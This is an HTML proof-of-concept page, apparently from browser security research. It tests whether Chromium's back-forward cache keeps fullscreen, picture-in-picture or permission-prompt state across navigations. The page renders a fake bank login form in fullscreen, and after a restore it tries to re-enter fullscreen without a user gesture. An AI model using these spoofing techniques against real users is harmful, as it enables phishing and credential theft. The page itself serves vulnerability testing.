<!DOCTYPE html>
<html>
<head>
<title>PoC 4: BFCache + Fullscreen State Persistence</title>
<!--
  VH-2026-004: BFCache Fullscreen State Desynchronization

  Target: Chromium 146+ (Desktop)

  Technique: This PoC tests whether BFCache incorrectly preserves
  fullscreen state across navigations, allowing an attacker's page
  to display in fullscreen mode with a stale URL or no URL bar.

  Attack chain:
  1. Page A enters fullscreen and renders fake browser chrome
  2. Page A navigates to Page B (cross-origin, e.g., bank.com)
  3. Page A is stored in BFCache
  4. User presses Back button
  5. Page A is restored from BFCache
  6. Test: Does fullscreen state persist? Does the URL bar show
     the correct origin or is it stale from Page B?

  Variants:
  A) requestFullscreen -> navigate cross-origin -> back
  B) requestFullscreen -> pushState -> navigate -> back -> back
  C) requestFullscreen + PiP -> navigate -> back (double state restore)
  D) requestFullscreen + pending permission -> navigate -> back
-->
</head>
<body style="font-family: -apple-system, sans-serif; padding: 40px; background: #f0f0f0;">

<h2>BFCache + Fullscreen State Persistence</h2>
<p>Tests whether BFCache incorrectly preserves fullscreen/UI state.</p>

<div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
  <button onclick="testVariantA()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
    A: Fullscreen + Navigate + Back
  </button>
  <button onclick="testVariantB()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
    B: Fullscreen + History Stack + Back
  </button>
  <button onclick="testVariantC()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
    C: Fullscreen + PiP + Navigate + Back
  </button>
  <button onclick="testVariantD()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
    D: Fullscreen + Pending Dialog + Back
  </button>
</div>

<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>

<script>
function log(msg) {
  const el = document.getElementById('log');
  if (el) el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
}

// Check if we were restored from BFCache
window.addEventListener('pageshow', (e) => {
  if (e.persisted) {
    log('PAGE RESTORED FROM BFCACHE!');
    log('Fullscreen active: ' + !!document.fullscreenElement);
    log('Document title: ' + document.title);
    log('Location: ' + location.href);

    // If we're still in fullscreen after BFCache restore, that's a finding
    if (document.fullscreenElement) {
      log('BUG: Fullscreen state persisted through BFCache!');
      log('Attacker content is displayed in fullscreen');
      log('CHECK: What does the URL bar show?');
    }

    // Try to re-enter fullscreen if not already
    setTimeout(() => {
      if (!document.fullscreenElement) {
        log('Attempting to re-enter fullscreen...');
        document.documentElement.requestFullscreen().then(() => {
          log('Re-entered fullscreen without user gesture after BFCache restore!');
        }).catch(e => {
          log('Fullscreen re-entry failed (expected): ' + e.message);
        });
      }
    }, 100);
  }
});

// Also check via the newer API
document.addEventListener('freeze', () => {
  log('Page is being frozen (BFCache entry)');
});

document.addEventListener('resume', () => {
  log('Page resumed (BFCache restore)');
  log('Fullscreen: ' + !!document.fullscreenElement);
});

// Variant A: Basic fullscreen + navigate + back
async function testVariantA() {
  log('[A] Entering fullscreen...');

  try {
    await document.documentElement.requestFullscreen();
    log('[A] Fullscreen entered');
  } catch(e) {
    log('[A] Fullscreen failed: ' + e.message);
    return;
  }

  // Render attacker content in fullscreen
  document.body.style.margin = '0';
  document.body.style.background = '#fff';
  document.body.innerHTML = `
    <div style="font-family: Arial; padding: 40px; max-width: 600px; margin: 0 auto;">
      <h1 style="color: #1a73e8;">Fake Bank Login</h1>
      <p>This content should NOT be visible after pressing Back.</p>
      <p>If this page is shown in fullscreen after BFCache restore, it's a bug.</p>
      <div style="border: 1px solid #ddd; padding: 20px; border-radius: 8px; margin-top: 20px;">
        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;">
        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px;">
        <button style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;">Sign In</button>
      </div>
      <p style="color: #5f6368; margin-top: 20px;">
        Navigating to example.com in 3 seconds...<br>
        After it loads, press the Back button.<br>
        Check if this page appears in fullscreen.
      </p>
    </div>
  `;

  // Navigate after delay (allows BFCache to store this page)
  setTimeout(() => {
    log('[A] Navigating to example.com...');
    // Use location.href for a regular navigation (BFCache eligible)
    location.href = 'https://example.com/';
  }, 3000);
}

// Variant B: Build a history stack, enter fullscreen, navigate, back multiple times
async function testVariantB() {
  log('[B] Building history stack...');

  // Create history entries
  history.pushState({step: 1}, '', '?step=1');
  history.pushState({step: 2}, '', '?step=2');
  history.pushState({step: 3}, '', '?step=3');
  log('[B] History stack: step=1, step=2, step=3');

  try {
    await document.documentElement.requestFullscreen();
    log('[B] Fullscreen entered at step=3');
  } catch(e) {
    log('[B] Fullscreen failed: ' + e.message);
    return;
  }

  document.body.style.margin = '0';
  document.body.style.background = '#fff';
  document.body.innerHTML = `
    <div style="font-family: Arial; padding: 40px;">
      <h1>Step 3: Fullscreen Active</h1>
      <p>History stack has 3 entries plus this fullscreen state.</p>
      <p>Navigating to example.com in 3 seconds...</p>
      <p>After loading, press Back TWICE to test BFCache + history interaction.</p>
      <p>CHECK: Does fullscreen persist? Which URL shows in the address bar?</p>
    </div>
  `;

  setTimeout(() => {
    location.href = 'https://example.com/';
  }, 3000);
}

// Variant C: Fullscreen + Document PiP + navigate + back
// Tests if BOTH fullscreen and PiP state persist through BFCache
async function testVariantC() {
  log('[C] Testing fullscreen + PiP + BFCache...');

  if (!('documentPictureInPicture' in window)) {
    log('[C] Document PiP not available');
    return;
  }

  try {
    await document.documentElement.requestFullscreen();
    log('[C] Fullscreen entered');
  } catch(e) {
    log('[C] Fullscreen failed: ' + e.message);
    return;
  }

  // Also open a PiP window
  try {
    const pipWindow = await documentPictureInPicture.requestWindow({
      width: 300,
      height: 200,
    });
    pipWindow.document.body.innerHTML = `
      <div style="font-family: Arial; padding: 20px;">
        <h3>PiP Window</h3>
        <p>This PiP was created while in fullscreen.</p>
        <p>Does it persist after BFCache restore?</p>
      </div>
    `;
    log('[C] PiP window opened');
  } catch(e) {
    log('[C] PiP failed: ' + e.message);
  }

  document.body.style.margin = '0';
  document.body.style.background = '#fff';
  document.body.innerHTML = `
    <div style="font-family: Arial; padding: 40px;">
      <h1>Fullscreen + PiP Active</h1>
      <p>Both fullscreen and PiP are active.</p>
      <p>Navigating in 3 seconds. Press Back after.</p>
      <p>CHECK: Do both fullscreen AND PiP persist after BFCache restore?</p>
    </div>
  `;

  setTimeout(() => {
    location.href = 'https://example.com/';
  }, 3000);
}

// Variant D: Fullscreen + pending permission dialog + navigate + back
// When user presses Back, does the permission dialog reappear?
// If so, is it for the correct origin?
async function testVariantD() {
  log('[D] Testing fullscreen + pending permission + BFCache...');

  try {
    await document.documentElement.requestFullscreen();
    log('[D] Fullscreen entered');
  } catch(e) {
    log('[D] Fullscreen failed: ' + e.message);
    return;
  }

  // Trigger a permission prompt
  navigator.geolocation.getCurrentPosition(
    () => log('[D] Geolocation granted'),
    () => log('[D] Geolocation denied')
  );
  log('[D] Permission prompt triggered');

  document.body.style.margin = '0';
  document.body.style.background = '#fff';
  document.body.innerHTML = `
    <div style="font-family: Arial; padding: 40px;">
      <h1>Fullscreen + Permission Pending</h1>
      <p>A geolocation permission prompt should be visible.</p>
      <p>Without dismissing the prompt, navigating in 5 seconds...</p>
      <p>After example.com loads, press Back.</p>
      <p>CHECK: Does the permission prompt reappear?</p>
      <p>CHECK: Is the origin correct if it does?</p>
      <p>CHECK: Is fullscreen still active?</p>
    </div>
  `;

  // Navigate while permission is still pending
  setTimeout(() => {
    log('[D] Navigating while permission is pending...');
    location.href = 'https://example.com/';
  }, 5000);
}
</script>
</body>
</html>
